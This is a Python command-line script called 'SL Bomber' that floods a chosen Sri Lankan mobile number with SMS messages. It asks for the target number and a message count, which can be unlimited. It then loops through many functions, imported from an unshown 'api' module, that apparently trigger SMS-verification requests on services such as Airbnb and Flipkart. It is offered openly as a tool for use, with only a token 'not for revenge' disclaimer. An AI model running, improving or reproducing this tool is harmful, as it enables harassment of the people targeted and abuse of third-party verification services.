#Script By Sandaru Ashen https://t.me/squad_sandaru
import os,random,time,sys
from urllib import request
from api import *
os.system('clear')
fore=['\x1b[91m','\x1b[34m','\x1b[36m','\x1b[93m','\x1b[32m','\x1b[35m','\x1b[31m','\x1b[94m','\x1b[96m','\x1b[92m','\x1b[33m','\x1b[95m']
logo=f'{random.choice(fore)}\x1b[1m\t\t   _________.__\n                  /   _____/|  |\n                  \\_____  \\ |  |\n                  /        \\|  |__\n                 /_______  /|____/\n   __________            \\/___.\n   \\______   \\ ____   _____\\_ |__   ___________\n    |    |  _//  _ \\ /     \\| __ \\_/ __ \\_  __ \\\n    |    |   (  <_> )  Y Y  \\ \\_\\ \\  ___/|  | \\/\n    |______  /\\____/|__|_|  /___  /\\___  >__|\n           \\/             \\/    \\/     \\/ {random.choice(fore)}v.1.4\n\t\t{random.choice(fore)}[+] By Sandaru Ashen'
bar=f'{random.choice(fore)}\x1b[1m_________________________{random.choice(fore)}_________________________\x1b[0m'
print(bar+'\n')
print(logo)
print(bar+'\n')
time.sleep(0.3)
print(f'\x1b[1m\t\t\x1b[92m1.Start SL Bomber\n\t\t\x1b[93m2.About\n\t\t\x1b[91m3.Exit')
try:
	from requests import post,get;from colorama import Fore,init,Style
except ModuleNotFoundError:
	print('\x1b[91m[!] Required Modules Aren\'t Installed!')
	time.sleep(1)
	print('\x1b[34m[*] Installing...')
	os.system('pip3 install requests colorama')
	print('\x1b[92m[+] Required Modules Installed!')
	os.system('clear')
	from requests import post,get
	from colorama import Fore,init,Style
	print(bar+'\n')
	print(logo)
	print(bar+'\n')
	print(f'\x1b[1m\t\t\x1b[92m1.Start SL Bomber\n\t\t\x1b[93m2.About\n\t\t\x1b[91m3.Exit')
init(autoreset=True)
def prsent(count,num):
	sys.stdout.write('\r' +random.choice(fore) +Style.BRIGHT+'\t[*]'+' Bombing '+str(num)+'\t'+str(count)+' Sent')
	sys.stdout.flush()
def Spinner():
	l=['|','/','-','\\']
	for i in l+l+l:
		sys.stdout.write('\r'+Style.BRIGHT+Fore.LIGHTYELLOW_EX+'[*] Checking Your Internet Connection  '+i)
		sys.stdout.flush()
		time.sleep(0.2)
time.sleep(0.3)
while True:
	try:
		cho=int(input(Fore.LIGHTCYAN_EX+Style.BRIGHT+'Enter Your Choice: '))
		if cho > 0 and cho <4:
			break
		else:
			Print(Fore.LIGHTRED_EX+Style.BRIGHT+'[!] Please Enter A Correct Choice!')
	except:
			print(Fore.LIGHTRED_EX+Style.BRIGHT+'[!] Incorrect Choice')
if cho==1:
	time.sleep(0.4)
	os.system('clear')
	print(bar+'\n')
	print(logo)
	print(bar+'\n')
	try:
		Spinner()
		request.urlopen('https://httpbin.org/get')
		print(Fore.LIGHTGREEN_EX+Style.BRIGHT+'\n[+] Connection Successful!')
		time.sleep(1.5)
		os.system('clear')
		print(bar+'\n')
		print(logo)
		print(bar+'\n')
	except:
		time.sleep(0.4)
		print(Fore.LIGHTRED_EX+Style.BRIGHT+'\n[!] You Aren\'t Connected To Internet!')
		time.sleep(0.3)
		print(Fore.LIGHTRED_EX+Style.BRIGHT+'[!] Please Connect To Internet To Continue...')
		time.sleep(0.3)
		input(Fore.LIGHTRED_EX+Style.BRIGHT+'[!] Exiting...\nPress Enter To Continue...')
		exit()
	while True:
		try:
			num=int(input(Style.BRIGHT+'Enter The Target No(07xxxxxxxx): '))
			num='0'+str(num)
			if len(num) == 10 and str(num)[0:3] in ('070','071','072','075','076','077','078'):
				break
			else:
				print(Fore.LIGHTRED_EX + 'Please Enter A Correct Number!')
				continue
		except ValueError:
			print(Fore.LIGHTRED_EX + 'Please Enter A Phone Number Not Letters!')
			continue
	time.sleep(0.4)
	while True:
		times=input(Style.BRIGHT+Fore.LIGHTYELLOW_EX+'How Many Messages (U) To Unlimited:')
		if times.isnumeric() or times == 'U' or	times == 'u':
			break
		else:
			print(Style.BRIGHT+Fore.LIGHTRED_EX+'[!] Enter A Correct Amount Or \'U\' For Unlimited')
	time.sleep(0.4)
	while True:
		delay=input(Style.BRIGHT+Fore.LIGHTMAGENTA_EX+'Enter Delay Time (In Seconds)\n\t\t[Recomended 5]:')
		if delay.isnumeric() and int(delay) > 0:
			delay=float(delay)
			break
		elif delay=='0':
			print(Style.BRIGHT+Fore.LIGHTRED_EX+'[!] Value Must Be More Than 0')
		else:
			delay=5.0
			break
	os.system('clear')
	print(bar+'\n')
	print(logo)
	print(bar+'\n')
	time.sleep(0.5)
	print(f'\t{Style.BRIGHT}Use This For Fun, Not For Revenge !!\n\tSL Bomber Created By Sandaru Ashen\n\t     https://t.me/squad_sandaru')
	print(bar+'\n')
	print(Fore.YELLOW+Style.BRIGHT+'\tPress Ctrl+c To Terminate The Bombing')
	if num[0:3] == '077' or num[0:3] == '076':
		count=0
		if times.isnumeric():
			while count< int(times):
				mega(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					yogo(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						guru(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							pat(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								doc(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									idea(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
										ona(num,delay)
										count+=1
										prsent(count,num)
										if count<int(times):
											sing(num,delay)
											count+=1
											prsent(count,num)
											if count<int(times):
												kangaroo(num,delay)
												count+=1
												prsent(count,num)
												if count<int(times):
													airbnb(num,delay)
													count+=1
													prsent(count,num)
													if count<int(times):
														flipkrt(num,delay)
														count+=1
														prsent(count,num)
														if count<int(times):
															savari(num,delay)
															count+=1
															prsent(count,num)
															if count<int(times):
																youcab(num,delay)
																count+=1
																prsent(count,num)
																if count<int(times):
																	upay(num,delay)
																	count+=1
																	prsent(count,num)
																	if count<int(times):
																		nanasa(num,delay)
																		count+=1
																		prsent(count,num)
																		if count<int(times):
																			domin(num,delay)
																			count+=1
																			prsent(count,num)
																			if count< int(times):
																				slmat(num,delay)
																				count+=1
																				prsent(count,num)
																				if count< int(times):
																					oli(num,delay)
																					count+=1
																					prsent(count,num)
																					if count< int(times):
																						echan(num,delay)
																						count+=1
																						prsent(count,num)
																					
		else:
			while True:
				mega(num,delay)
				count+=1
				prsent(count,num)
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				flipkrt(num,delay)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
				echan(num,delay)
				count+=1
				prsent(count,num)
				oli(num,delay)
				count+=1
				prsent(count,num)
	elif num[0:3] == '071' or num[0:3] == '070':
		count=0
		if times.isnumeric():
			while count< int(times):
				dtamart(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					dtamart2(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						yogo(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							guru(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								kangaroo(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									airbnb(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
										pat(num,delay)
										count+=1
										prsent(count,num)
										if count<int(times):
											doc(num,delay)
											count+=1
											prsent(count,num)
											if count<int(times):
												idea(num,delay)
												count+=1
												prsent(count,num)
												if count<int(times):
													ona(num,delay)
													count+=1
													prsent(count,num)
													if count<int(times):
														flipkrt(num,delay)
														count+=1
														prsent(count,num)
														if count<int(times):
															savari(num,delay)
															count+=1
															prsent(count,num)
															if count<int(times):
																sing(num,delay)
																count+=1
																prsent(count,num)
																if count<int(times):
																	youcab(num,delay)
																	count+=1
																	prsent(count,num)
																	if count<int(times):
																		upay(num,delay)
																		count+=1
																		prsent(count,num)
																		if count<int(times):
																			nanasa(num,delay)
																			count+=1
																			prsent(count,num)
																			if count<int(times):
																				domin(num,delay)
																				count+=1
																				prsent(count,num)
																				if count< int(times):
																					slmat(num,delay)
																					count+=1
																					prsent(count,num)
																					if count< int(times):
																						mobself(num,delay)
																						count+=1
																						prsent(count,num)
																						if count< int(times):
																							oli(num,delay)
																							count+=1
																							prsent(count,num)
																							if count< int(times):
																								echan(num,delay)
																								count+=1
																								prsent(count,num)
		else:
			while True:
				dtamart(num,delay)
				count+=1
				prsent(count,num)
				dtamart2(num,delay)
				count+=1
				prsent(count,num)
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				mobself(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				flipkrt(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
				echan(num,delay)
				count+=1
				prsent(count,num)
				oli(num,delay)
				count+=1
				prsent(count,num)
	elif num[0:3] == '078' or num[0:3] == '072':
		count=0
		if times.isnumeric():
			while count< int(times):
				hutcliq(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					hutself(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						yogo(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							guru(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								kangaroo(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									pat(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
										doc(num,delay)
										count+=1
										prsent(count,num)
										if count<int(times):
										  sing(num,delay)
										  count+=1
										  prsent(count,num)
										  if count<int(times):
										  	idea(num,delay)
										  	count+=1
										  	prsent(count,num)
  											if count<int(times):
  												ona(num,delay)
  												count+=1
  												prsent(count,num)
  												if count<int(times):
  													airbnb(num,delay)
  													count+=1
  													prsent(count,num)
  													if count<int(times):
  														flipkrt(num,delay)
  														count+=1
  														prsent(count,num)
  														if count<int(times):
  															savari(num,delay)
  															count+=1
  															prsent(count,num)
  															if count<int(times):
  																youcab(num,delay)
  																count+=1
  																prsent(count,num)
  																if count<int(times):
  																	upay(num,delay)
  																	count+=1
  																	prsent(count,num)
  																	if count<int(times):
  																		nanasa(num,delay)
  																		count+=1
  																		prsent(count,num)
  																		if count<int(times):
  																			domin(num,delay)
  																			count+=1
  																			prsent(count,num)
  																			if count< int(times):
  																				slmat(num,delay)
  																				count+=1
  																				prsent(count,num)
																				  if count< int(times):
																					oli(num,delay)
																					count+=1
																					prsent(count,num)
																					if count< int(times):
																						echan(num,delay)
																						count+=1
																						prsent(count,num)
		else:
			while True:
				hutcliq(num,delay)
				count+=1
				prsent(count,num)
				hutself(num,delay)
				count+=1
				prsent(count,num)
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				flipkrt(num,delay)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
				echan(num,delay)
				count+=1
				prsent(count,num)
				oli(num,delay)
				count+=1
				prsent(count,num)
	elif num[0:3] == '075':
		count=0
		if times.isnumeric():
			while count< int(times):
				yogo(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					guru(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						kangaroo(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							pat(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								doc(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									idea(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
									  sing(num,delay)
									  count+=1
									  prsent(count,num)
									  if count<int(times):
  										ona(num,delay)
  										count+=1
  										prsent(count,num)
  										if count<int(times):
  											airbnb(num,delay)
  											count+=1
  											prsent(count,num)
  											if count<int(times):
  												flipkrt(num,delay)
  												count+=1
  												prsent(count,num)
  												if count<int(times):
  													savari(num,delay)
  													count+=1
  													prsent(count,num)
  													if count<int(times):
  														youcab(num,delay)
  														count+=1
  														prsent(count,num)
  														if count<int(times):
  															upay(num,delay)
  															count+=1
  															prsent(count,num)
  															if count<int(times):
  																nanasa(num,delay)
  																count+=1
  																prsent(count,num)
  																if count<int(times):
  																	domin(num,delay)
  																	count+=1
  																	prsent(count,num)
  																	if count< int(times):
  																		slmat(num,delay)
  																		count+=1
  																		prsent(count,num)
																		  if count< int(times):
																			oli(num,delay)
																			count+=1
																			prsent(count,num)
																			if count< int(times):
																				echan(num,delay)
																				count+=1
																				prsent(count,num)
		else:
			while True:
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				flipkrt(num,delay)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
				echan(num,delay)
				count+=1
				prsent(count,num)
				oli(num,delay)
				count+=1
				prsent(count,num)
	print('\n'+bar+'\n')
	time.sleep(0.90)
	print(f'{Style.BRIGHT}{Fore.LIGHTGREEN_EX}\t[+] Bombing Successful')
	time.sleep(0.75)
	ag=input(f'\t{Style.BRIGHT}{random.choice(fore)}[?] Run The Bomber Again?(y/n) ')
	if ag == 'Y' or ag == 'y':
		os.system('python3 slbomber.py')
	else:
		exit()
elif cho == 2:
	os.system('clear')
	print(bar+'\n')
	print(logo)
	print(bar+'\n')
	print(f'{Style.BRIGHT}\t\t\tAbout\n{random.choice(fore)}[+] Special Thanks To Packet Sniffing Software\n{random.choice(fore)}[+] If You Have Any Complains Or Future Requests Contact Me @ https://t.me/squad_sandaru\n{random.choice(fore)}[+] Never Use The Script To Cause Harm/Discomfort/Trouble To Others\n{random.choice(fore)}[!] If You Know More Websites And Apps That Use SMS Verification Please Inform Me')
	input(f'{Style.BRIGHT}{random.choice(fore)}\t[+] Press ENTER To Go Back To Main Menu')
	os.system('python3 slbomber.py')
else:
	exit()
